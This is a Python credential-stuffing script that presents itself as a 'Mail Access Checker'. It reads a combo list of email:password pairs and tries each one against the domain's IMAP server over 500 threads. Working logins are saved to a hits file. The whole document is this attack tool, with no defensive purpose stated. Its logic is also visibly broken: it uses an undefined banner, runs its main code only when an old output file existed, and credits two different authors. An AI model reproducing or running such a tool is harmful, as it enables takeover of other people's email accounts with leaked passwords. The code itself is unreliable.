import imaplib, ctypes
from multiprocessing import Lock
from multiprocessing.dummy import Pool
from tkinter import *
from tkinter import filedialog
from os import getcwd
from datetime import datetime
import email
from pathlib import Path
import time, os
from colorama import init
from colorama import Fore
init(autoreset=True)
dt = datetime.now()
screen = lambda : os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW('Mail Access Checker By haru1ca')
input(dt.strftime('%d/%m/%Y %H:%M:%S') + ' ' + 'Press Enter To Load Your Combo.')
root = Tk()
root.withdraw()
filename = filedialog.askopenfilename(initialdir=(getcwd()), title='Select A Combo', filetypes=(('txt files', '*.txt'),
                                                                                                ('all files', '*.*')))
total = len(open(filename, errors='ignore').readlines())
screen()
print(banner)
try:
    path = Path('MailAcces.txt')
    path.unlink()
except FileNotFoundError:
    pass
else:
    faild = 0
    success = 0
    valid = 0
    cpm = 0
    lock = Lock()

    class cpm_:

        def __init__(self):
            pass

        def cpmrunner(self):
            global cpm
            global faild
            global valid
            oldchecked = valid + faild
            time.sleep(1)
            newchecked = faild + valid
            cpm = (newchecked - oldchecked) * 60
            return cpm


    class tester:

        def __init__(self):
            self.account = []

        def post(self, email_, password):
            global faild
            global total
            global valid
            ctypes.windll.kernel32.SetConsoleTitleW(f"Mail Access Checker | Checked: {faild} / {total} | Hits: {valid} | Remaining: {self.cpm()} | Cpm: {cpm_().cpmrunner()} | By BLackbeard")
            try:
                faild += 1
                user = email_
                cl = user.split('@')
                server = cl[1]
                password = password
                imap_url = 'imap.' + server
                r = imaplib.IMAP4_SSL(imap_url)
                r.login(user, password)
                lock.acquire()
                dt = datetime.now()
                print(dt.strftime('%d/%m/%Y %H:%M:%S') + ' ' + '{}:{}'.format(user, password))
                valid += 1
                with open('MailAcces.txt', 'a') as (o):
                    o.write(user + ':' + password + '\n')
                    lock.release()
            except:
                pass

        def cpm(self):
            defr = total - faild
            return defr

        def combo(self):
            with open(filename, errors='ignore') as (p):
                clean = [i.rstrip() for i in p]
                for line in clean:
                    try:
                        data = line.split(':')
                        self.account.append({'email':data[0],  'password':data[1]})
                    except IndexError:
                        pass

        def sender(self, account):
            user = account['email']
            mot_pass = account['password']
            self.post(user, mot_pass)

        def threads(self):
            self.combo()
            pool = Pool(500)
            for _ in pool.imap_unordered(self.sender, self.account):
                pass


    if __name__ == '__main__':
        tester().threads()
        print(input('Press Any Key To Exit...'))
